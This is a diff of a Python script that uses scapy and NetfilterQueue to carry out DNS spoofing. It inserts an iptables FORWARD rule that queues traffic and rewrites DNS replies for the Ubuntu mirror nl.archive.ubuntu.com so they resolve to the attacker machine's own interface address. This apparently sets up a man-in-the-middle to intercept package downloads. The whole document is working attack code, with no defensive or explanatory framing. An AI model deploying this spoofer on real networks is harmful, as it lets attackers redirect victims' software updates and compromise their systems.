@@ -1,21 +1,24 @@
-from scapy.all import IP, DNS, DNSRR, DNSQR, UDP
+from scapy.all import IP, DNS, DNSRR, DNSQR, UDP, get_if_addr
 from netfilterqueue import NetfilterQueue
 import os
 from mirrors import getListOfMirrors
 
-# iface = "enp0s3"
-iface = "enp7s0"
+def dns_spoof(interface):
+    global iface
+    iface = interface
 
-def dns_spoof():
     QUEUE_NUM = 0
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
 
     nfqueue = NetfilterQueue()
 
     try:
+        print("Started DNS spoofing")
+
         nfqueue.bind(QUEUE_NUM, process_packet)
         nfqueue.run()
     except KeyboardInterrupt:
+        print("Stopped DNS spoofing")
         os.system("iptables --flush")
 
 def process_packet(packet):
@@ -34,11 +37,12 @@ def process_packet(packet):
 
 def modify_packet(packet):
     qname = packet[DNSQR].qname
-    mirrors = getListOfMirrors()
+    # print("Getting list of mirrors")
+    # mirrors = getListOfMirrors()
     # Commented put bc I need to research how exactly the DNS qname stuff works, bc it seems slightly strange and I am too tired to do it right now haha
     # if qname in mirrrors:
     if qname == b"nl.archive.ubuntu.com.":
-        packet[DNS].an = DNSRR(rrname=qname, rdata="192.168.192.11")
+        packet[DNS].an = DNSRR(rrname=qname, rdata=get_if_addr(iface))
 
         packet[DNS].ancount = 1
 
@@ -48,5 +52,3 @@ def modify_packet(packet):
         del packet[UDP].chksum
 
     return packet
-
-dns_spoof()
